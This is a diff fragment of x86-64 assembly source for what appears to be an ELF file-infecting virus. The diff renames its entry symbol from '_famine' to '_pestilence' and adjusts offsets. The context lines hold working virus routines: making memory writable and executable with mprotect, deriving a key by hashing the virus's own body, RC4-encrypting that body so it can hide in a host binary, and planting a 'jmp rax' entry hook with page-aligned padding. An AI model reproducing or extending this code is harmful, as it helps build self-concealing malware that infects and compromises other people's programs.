@@ -3,9 +3,9 @@
 default rel
 
 section .text
-    global _famine
+    global _pestilence
 
-_famine:
+_pestilence:
     PUSH
     mov rbp, rsp        ; 48 89 e5     mov %rsp,%rbp
     lea rsi, [rel obfu]
@@ -118,7 +118,7 @@ decrypt:
     mov rdx, 7  ; int prot PROT_READ|PROT_WRITE|PROT_EXEC
     mov rax, 10 ; mprotect
     syscall
-    lea rdi, [rel _famine]
+    lea rdi, [rel _pestilence]
     mov rdx, (FAMINE_SIZE - (CHUNKS_SIZE))
     call fnv            ; key in rax
     mov rdi, rax
@@ -742,14 +742,14 @@ mimic:
 ;-------------------------------------------------------------
 ; Encryption
 ;-------------------------------------------------------------
-    lea rdi, [rel _famine]
+    lea rdi, [rel _pestilence]
     mov rdx, (FAMINE_SIZE) - (CHUNKS_SIZE)
     call fnv ; res in RAX
     sub rsp, FAMINE_SIZE
     mov rcx, FAMINE_SIZE
 
     ; Maybe this doesnt word for the rep movsb.?.?
-    lea rsi, [rel _famine]
+    lea rsi, [rel _pestilence]
     mov rdi, rsp
     rep movsb ; copy to stack
 ; Key to string for RC4
@@ -781,13 +781,13 @@ mimic:
     mov [rbp - 22], word 0xe0ff                                     ; jmp rax
 ;write vars
     write_rel r8, [rbp - 32], 0xc
-    write_rel r8, [rel hook.folder_1], 70
+    write_rel r8, [rel hook.folder_1], 74
 ;-------------------------------------------------------------
 ; Write remaining paddng accordnig to page size
 ;-------------------------------------------------------------
     PAGE_ALIGN FAMINE_SIZE
     sub rcx, FAMINE_SIZE
-    sub rcx, 82                                                     ; jmp entry + vars
+    sub rcx, 86                                               ; jmp entry + vars
     mov r9, rcx
 ;-------------------------------------------------------------
 ; IDK if we can optimize that
